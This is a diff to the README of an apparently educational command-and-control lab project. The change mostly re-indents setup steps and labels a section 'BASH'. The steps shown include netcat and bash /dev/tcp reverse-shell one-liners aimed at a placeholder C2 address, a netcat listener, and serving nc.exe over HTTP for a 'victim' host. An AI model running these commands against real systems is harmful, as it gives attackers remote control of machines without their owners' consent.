@@ -34,18 +34,18 @@ Build and understand C2 infrastructure.
           - Copy `stardestoryer` to VICTIM
           - `chmod +x stardestroyer`
           - `./stardestroyer`
-  - Windows
-    - NETCAT
-    - This will drop the moment the C2 server 'drops'
-        - `C:\Windows\Temp\nc.exe -e cmd.exe $C2-IP 9999`
-    - If your C2 OS is Kali, you can host a python http.server with nc.exe and run `stardestroyer.ps1`
-        - On Kali
-            - `find / -name nc.exe 2>/dev/null`
-            - `sudo cp /usr/share/windows-resources/binaries/nc.exe .`
-            - `python3 -m http.server 80`
-        - On Windows
-            - Powershell.exe
-            - `.\stardestroyer.ps1`
+    - Windows
+        - NETCAT
+        - This will drop the moment the C2 server 'drops'
+            - `C:\Windows\Temp\nc.exe -e cmd.exe $C2-IP 9999`
+        - If your C2 OS is Kali, you can host a python http.server with nc.exe and run `stardestroyer.ps1`
+            - On Kali
+                - `find / -name nc.exe 2>/dev/null`
+                - `sudo cp /usr/share/windows-resources/binaries/nc.exe .`
+                - `python3 -m http.server 80`
+            - On Windows
+                - Powershell.exe
+                - `.\stardestroyer.ps1`
 4. Start your listener 
     - `nc -nvlp 4444`
 5. Forward the connection to your listener
@@ -59,6 +59,7 @@ Build and understand C2 infrastructure.
     - `python3 deathstar-term.py`
 2. Have Victim connect to C2
     - Linux / MacOS
+      - BASH
       - This will drop the moment the C2 server 'drops'
           - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
       - Python reverse shell
